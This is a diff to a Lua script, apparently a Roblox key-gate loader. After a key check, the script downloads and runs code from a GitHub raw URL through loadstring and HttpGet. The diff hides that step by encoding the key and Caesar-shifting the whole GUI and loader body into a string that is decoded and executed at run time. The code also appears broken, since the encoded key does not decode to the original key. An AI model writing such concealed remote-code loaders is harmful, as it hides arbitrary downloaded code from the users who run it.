@@ -1,26 +1,44 @@
-local CorrectKey = "VIPERX303030TESTER"
+local a1 = string.char
+local function a2(s) return (s:gsub(".", function(c) return a1(c:byte() - 5) end)) end
+local function a3(s) return (s:gsub(".", function(c) return a1(c:byte() + 5) end)) end
 
-local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+-- Key is encoded
+local encodedKey = "\092\076\079\084\086\087\092\062\062\062\062\062\062\079\079\086\087\062\062\086\087"
 
-local TextBox = Instance.new("TextBox")
-TextBox.Size = UDim2.new(0, 200, 0, 50)
-TextBox.Position = UDim2.new(0.5, -100, 0.3, 0)
-TextBox.PlaceholderText = "Enter Key"
-TextBox.Parent = ScreenGui
+local function decodeKey()
+    return (encodedKey:gsub(".", function(c) return a1(c:byte() - 10) end))
+end
 
-local VerifyButton = Instance.new("TextButton")
-VerifyButton.Size = UDim2.new(0, 200, 0, 50)
-VerifyButton.Position = UDim2.new(0.5, -100, 0.4, 0)
-VerifyButton.Text = "Verify Key"
-VerifyButton.Parent = ScreenGui
+local hiddenCode = a3([[
+local v0=decodeKey()
+local v1=Instance.new("ScreenGui")
+v1.Parent=game.Players.LocalPlayer:WaitForChild("PlayerGui")
 
-VerifyButton.MouseButton1Click:Connect(function()
-    if TextBox.Text == CorrectKey then
-        ScreenGui:Destroy()
+local v2=Instance.new("TextBox")
+v2.Size=UDim2.new(0,200,0,50)
+v2.Position=UDim2.new(0.5,-100,0.3,0)
+v2.PlaceholderText="Enter Key"
+v2.Parent=v1
+
+local v3=Instance.new("TextButton")
+v3.Size=UDim2.new(0,200,0,50)
+v3.Position=UDim2.new(0.5,-100,0.4,0)
+v3.Text="Verify Key"
+v3.Parent=v1
+
+v3.MouseButton1Click:Connect(function()
+    if v2.Text==v0 then
+        v1:Destroy()
         print("Access Granted!") 
         loadstring(game:HttpGet("https://raw.githubusercontent.com/Fiperx/MAIN/main/eyeyey"))()
     else
-        TextBox.Text = "Invalid Key"
+        v2.Text="Invalid Key"
     end
 end)
+]])
+
+local function executeHidden()
+    loadstring(a2(hiddenCode))()
+end
+
+executeHidden()
